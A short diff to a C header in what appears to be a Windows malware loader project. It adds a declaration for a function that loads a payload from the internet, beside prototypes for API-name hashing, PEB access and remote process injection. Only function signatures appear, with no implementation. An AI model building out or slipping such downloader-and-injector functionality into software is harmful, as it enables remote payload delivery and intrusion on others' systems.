@@ -645,6 +645,7 @@ BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);
 UINT32 HashStringRotr32W(LPCWSTR String);
 LPCSTR LowerCaseStringA(IN LPCSTR str);
 PPEB RtlGetProcessEnvironmentBlock();
+BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize);
 
 // Defined in Injection.c
 BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
